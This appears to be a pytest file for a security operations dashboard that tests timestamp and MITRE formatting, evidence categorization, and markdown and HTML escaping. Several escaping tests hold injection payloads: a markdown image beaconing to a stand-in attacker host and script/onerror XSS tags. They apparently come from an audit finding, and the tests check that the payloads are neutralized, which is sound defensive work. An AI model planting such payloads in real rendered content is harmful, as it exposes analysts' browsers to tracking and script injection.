from dashboard.components.ui import mono, safe_html
from shared.formatters import format_timestamp, format_mitre, categorize_evidence, escape_markdown

def test_format_timestamp_valid():
    ts = "2026-09-01T08:20:31.103820+00:00"
    formatted = format_timestamp(ts)
    assert formatted == "2026-09-01 08:20:31 UTC"

def test_format_timestamp_invalid():
    assert format_timestamp("invalid_time") == "Invalid Time"
    assert format_timestamp("") == "Unknown Time"

def test_format_mitre():
    assert format_mitre("Command and Control", "T1071") == "Command and Control (T1071)"
    assert format_mitre("Discovery", "") == "Discovery"
    assert format_mitre("", "") == "Unmapped"

def test_categorize_evidence():
    evidence = {
        "query": "malicious.com",
        "orig_bytes": 500,
        "shannon_entropy": 4.5,
        "ml_confidence_score": 0.9,
        "process_name": "unknown",
        "user_id": ""
    }
    
    obs, inf, unk = categorize_evidence(evidence)
    
    # Observed facts
    assert "query" in obs
    assert "orig_bytes" in obs
    
    # Inferred/Calculated facts
    assert "shannon_entropy" in inf
    assert "ml_confidence_score" in inf
    
    # Unknown/Missing facts
    assert "process_name" in unk
    assert "user_id" in unk

def test_escape_markdown_neutralizes_link_and_image_injection():
    # The concrete exploit from the audit: a crafted DNS query rendered as
    # a markdown image, which would make the analyst's browser fetch an
    # attacker URL the instant the incident is opened.
    payload = "`![](https://attacker.tld/beacon?h=x)`"
    escaped = escape_markdown(payload)
    assert "![" not in escaped
    assert "](" not in escaped
    # Every special character is backslash-escaped
    assert escaped == r"\`\!\[\]\(https://attacker\.tld/beacon?h=x\)\`"

def test_escape_markdown_is_visually_inert_for_ordinary_values():
    # CommonMark consumes the backslash and renders the literal character,
    # so ordinary evidence values (IPs, hostnames) are unaffected visually
    # -- only demonstrating that escaping doesn't mangle common content.
    assert escape_markdown("10.0.0.1") == r"10\.0\.0\.1"
    assert escape_markdown(500) == "500"


def test_mono_html_escapes_an_injected_tag():
    # dashboard/pages/command_center.py's TSOC-2026-02 stored-XSS finding:
    # source_ip flows unvalidated into incident_id, then into mono() calls
    # rendered with unsafe_allow_html=True. The escaping must happen
    # inside mono() itself, not depend on the caller remembering it.
    payload = '<img src=x onerror=alert(1)>'
    rendered = mono(payload)
    assert "<img" not in rendered
    assert rendered == '<span class="tsoc-mono">&lt;img src=x onerror=alert(1)&gt;</span>'


def test_mono_wraps_ordinary_values_visually_unchanged():
    assert mono("INC-10-0-0-5") == '<span class="tsoc-mono">INC-10-0-0-5</span>'


def test_safe_html_escapes_an_injected_tag():
    payload = '<script>alert(1)</script>'
    assert "<script" not in safe_html(payload)
